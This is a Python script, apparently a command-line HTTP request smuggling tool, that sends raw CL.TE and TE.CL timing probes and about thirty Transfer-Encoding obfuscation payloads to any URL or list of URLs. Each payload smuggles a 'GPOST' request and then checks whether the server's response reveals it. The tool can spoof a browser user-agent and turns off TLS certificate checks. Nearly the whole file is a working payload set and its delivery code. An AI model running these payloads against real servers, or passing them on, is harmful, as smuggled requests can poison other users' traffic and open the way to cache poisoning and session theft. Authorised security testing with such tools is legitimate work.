#!/usr/bin/python3
import requests
import argparse
import sys
from fake_useragent import UserAgent
import time
import socket, ssl
from urllib.parse import urlparse


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class checkServer:
    agent = ''
    timeout = 5
    loop = 1
    tmp = 0
    
    def __init__(self, args):
        self.agent = args.agent
        # self.timeout = args.timeout
    
    def start(self, url, req):
        if self.checkCLTE(url, req) == 0:
            # self.clear(url)
            if self.checkTECL(url, req) == 0:
                # self.clear(url)
                if self.checkTETE(url, req) == 0:
                    print(f"{bcolors.FAIL}[!] Not found vulnerability.{bcolors.ENDC}")
                    
    
    def clear(self, url):
        requests.get(url, headers={"User-Agent" : self.agent})
    
    # Check server is CL.CL
    def checkCLCL(self):
        header_payload = {
            "Content-Length": ""
        }
    
    # Check server is CL.TE
    # Timing tech
    def checkCLTE(self, url, req):
        print("[*] Testing CL.TE...")
        
        urlInfo = urlparse(url)
        path = urlInfo.path if len(urlInfo.path) > 0 else "/"
        header = 'POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n'.format(path, urlInfo.netloc)
        data = '0\r\n\r\n\r\n'
        
        start = time.time()
        sendPayload(url, header, data)
        
        if time.time() - start >= self.timeout:
            self.printResult(header, data)
            return 1
        return 0
        
    # Check server is TE.CL
    # Timing tech
    def checkTECL(self, url, req):
        print("[*] Testing TE.CL...")
        
        urlInfo = urlparse(url)
        path = urlInfo.path if len(urlInfo.path) > 0 else "/"
        header = 'POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n'.format(path, urlInfo.netloc)
        data = '0\r\n\r\n\r\n'
        
        start = time.time()
        sendPayload(url, header, data)
        
        if time.time() - start >= self.timeout:
            self.printResult(header, data)
            return 1
        return 0
        
    # Check server is TE.TE    
    def checkTETE(self, url, req):
        print("[*] Testing TE.TE...")
        
        urlInfo = urlparse(url)
        path = urlInfo.path if len(urlInfo.path) > 0 else "/"
        
        payload = [ {
                "vulName" : "normal",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "space",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding : chunked\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "valueSpace",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:  chunked\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "nospace",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:chunked\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "tab",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:\tchunked\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "vert",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:\u000Bchunked\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "commaX",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked, x\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "Xcomma",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x, chunked\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "contentEnc",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nContent-Encoding: x\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "newline",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \nchunked\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "newlineVal",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding\n : chunked\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "Singlequote",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: 'chunked'\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "Douquote",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \"chunked\"\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "newlineVert",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \n\u000Bx\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "newlineTab",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \n\tx\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "dualChunk",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "chunk",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunk\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "multiCase",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cHuNkeD\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "uppercase",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: CHUNKED\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "\\r",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "tab\\r",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\t\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "Xdualchunk",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\nTransfer-Encoding: chunked\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "TEnewline",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer\r-Encoding: chunked\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "Dualnewline",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nFoo: x\n\nTransfer-Encoding: chunked\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "XCB",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x chunked bar\r\n\r\n".format(path, urlInfo.netloc, self.agent),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "chr(255)",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:{}chunked\r\n\r\n".format(path, urlInfo.netloc, self.agent , chr(255)),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "chr(160)",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:{}chunked\r\n\r\n".format(path, urlInfo.netloc, self.agent , chr(160)),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "chr(130)",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfe{}r-Encoding: chunked\r\n\r\n".format(path, urlInfo.netloc, self.agent , chr(130)),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "chr(150)",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agnet: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chu{}nked\r\n\r\n".format(path, urlInfo.netloc, self.agent , chr(150)),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            }
            
        ]
        
        for p in payload:
            for i in range(self.loop):
                sendPayload(url, p["header"], p["data"])
                
                # Send one normal request to test TETE.
                # normal_header = 'POST {} HTTP/1.1\r\nHost: {}'.format(path, urlInfo.netloc)
                res = requests.post(url, headers={"User-agent" : self.agent})
                
                # Check if request is smuggled.
                if res.text.find("GPOST") != -1:
                    self.printResult(p["header"], p["data"], p["vulName"])
                    self.tmp = 1
                    # break
                    return 1
        return 0
    
       
    def printResult(self, header, data, name = ''):
        if sys._getframe(1).f_code.co_name.find("TETE") == -1 and self.tmp == 0:
            print(f'{bcolors.WARNING}[*] Server using {sys._getframe(1).f_code.co_name.replace("check", "")[:4]}{bcolors.ENDC}')
        print(f"{bcolors.WARNING}>> {name}{bcolors.ENDC}")
        print(f"{bcolors.FAIL}====== payload ======")
        print(header + data, end="")
        print(f"======================{bcolors.ENDC}\n\n")

# Reference
# https://stackoverflow.com/questions/28670835/python-socket-client-post-parameters
# https://stackoverflow.com/questions/32062925/python-socket-server-handle-https-request
def sendPayload(url, header, data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    parse = urlparse(url)
    
    if parse.scheme == "https":
        port = 443
        context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
        context.verify_mode = ssl.CERT_NONE
        s = context.wrap_socket(s, server_hostname=parse.netloc)
    else:
        port = 80
    
    s.connect((parse.netloc, port))
    s.sendall(header.encode('iso-8859-1') + data.encode('ascii'))
    
    # If testing TETE, no recive data.
    # if sys._getframe(1).f_code.co_name.find("TETE") != -1:
    #     return
    
    response = s.recv(1000).decode('utf-8')
    status_code = response[:response.index("\r\n")]
    print("     └───> "+status_code)
    

# Generate fake user-agent
def generateUserAgent():
    print("[*] Generating fake user-agent...")
    useragent = UserAgent().chrome
    print("[*] Done.")
    return useragent


def banner():
	print("""
                                         _                             
         ___ _ __ ___  _   _  __ _  __ _| | ___ _ __       _ __  _   _ 
        / __| '_ ` _ \| | | |/ _` |/ _` | |/ _ \ '__|     | '_ \| | | |
        \__ \ | | | | | |_| | (_| | (_| | |  __/ |     _  | |_) | |_| |
        |___/_| |_| |_|\__,_|\__, |\__, |_|\___|_|    (_) | .__/ \__, |
                             |___/ |___/                  |_|    |___/ 
                        by universe                 ver 0.2
""")
	pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description = "HTTP request Smuggler tools")
    
    parser.add_argument("--url", required=False, help="Input url. --url https://lactea.kr")
    parser.add_argument("--agent", required=False, action="store_true", help="Generating random User-Agent. --agent")
    parser.add_argument("--file", required=False, help="Enter your file name. --file ips.txt")
    # parser.add_argument("--timeout", required=False, default=7, type=int, help="Set timeout. Default: 5s. --timeout [time]")

    args = parser.parse_args()
    
    banner()
    
    # Setting
    if args.url == "" or args.url == None:
        if args.file == "" or args.file == None:
            print("[!] Input URL.")
            exit()
    if args.agent == True:
        args.agent = generateUserAgent()
    else:
        args.agent = "Smuggler test"
    
    url = []
    if args.file:
        try:
            f = open(args.file, "r")
        except IOError as e:
            print(f"{bcolors.FAIL}[!] No such file {args.file}.{bcolors.ENDC}")
            exit()
        
        while True:
            line = f.readline()
            if not line: break
            if len(line) == 0: continue
            url.append(line.replace("\n", ""))
    else:
        url.append(args.url)
    
    
    for u in url:
        try:
            r = requests.get(u, headers={"User-agent" : args.agent})
        except requests.exceptions.MissingSchema as e:
            print(f"{bcolors.FAIL}[!] No schema. Input url including http:// or https://.{bcolors.ENDC}")
            exit()
        tester = checkServer(args)
        
        print(f"\n\n[*] Sending to {bcolors.WARNING}{u}{bcolors.ENDC}")
        
        tester.start(u, r)